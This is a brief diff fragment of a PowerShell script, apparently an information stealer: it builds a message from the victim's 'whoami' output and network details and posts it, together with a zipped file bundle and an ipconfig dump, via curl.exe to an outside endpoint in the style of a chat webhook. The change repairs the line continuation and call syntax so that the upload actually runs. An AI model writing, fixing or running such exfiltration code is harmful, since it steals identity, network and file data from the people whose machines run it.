@@ -38,8 +38,8 @@ $whoami_content = whoami
 $payload = (@{ content = "@everyone: $whoami_content | $networkInfo" } | ConvertTo-Json -Compress)
 
 
-curl.exe -X POST `
-  -H "Content-Type: application/json" \
+& curl.exe -X POST `
+  -H "Content-Type: application/json" `
   -F "payload_json=$payload" `
   -F "file1=@$zip" `
   -F "file2=@$e\ipcfg.txt" `
